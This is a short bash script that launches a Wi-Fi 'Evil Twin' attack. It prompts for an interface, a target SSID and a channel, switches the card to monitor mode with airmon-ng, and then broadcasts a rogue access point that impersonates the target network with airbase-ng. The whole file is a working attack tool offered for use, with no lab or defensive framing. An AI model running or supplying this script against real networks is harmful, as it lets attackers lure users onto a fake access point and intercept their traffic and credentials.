#!/bin/bash

# Prompt user for input
read -p "Enter your wireless interface (e.g., wlan0): " iface
read -p "Enter the SSID of the target network: " ssid
read -p "Enter the channel to broadcast on: " channel

# Start monitor mode
echo "[*] Starting monitor mode on $iface..."
airmon-ng start "$iface"

# Derive monitor mode interface name (usually adds "mon")
iface_mon="${iface}mon"

# Start Evil Twin AP with airbase-ng
echo "[*] Launching Evil Twin with SSID: $ssid on channel $channel..."
airbase-ng -e "$ssid" -c "$channel" "$iface_mon"
